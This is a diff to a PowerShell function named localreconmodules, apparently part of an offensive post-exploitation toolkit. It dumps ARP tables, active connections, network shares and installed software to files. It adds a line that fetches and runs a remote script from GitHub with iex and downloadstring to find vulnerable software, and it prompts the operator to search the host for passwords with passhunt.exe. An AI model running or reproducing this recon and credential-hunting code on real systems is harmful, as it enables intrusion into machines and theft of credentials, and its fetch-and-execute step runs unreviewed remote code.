@@ -332,9 +332,10 @@ function localreconmodules
             Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$currentPath\LocalRecon\ArpTable.txt"
             netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
             net share >> "$currentPath\LocalRecon\Networkshares.txt"
-	    wmic product get name,version >> "$currentPath\LocalRecon\InstalledSoftware.txt"
 	    Get-Installedsoftware -Property DisplayVersion,InstallDate >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"
             
+	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Vulmap.ps1')
+	    Invoke-Vulmap >> "$currentPath\LocalRecon\VulnerableSoftware.txt"
             
             $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
             if ($passhunt -eq "yes" -or $passhunt -eq "y" -or $passhunt -eq "Yes" -or $passhunt -eq "Y")
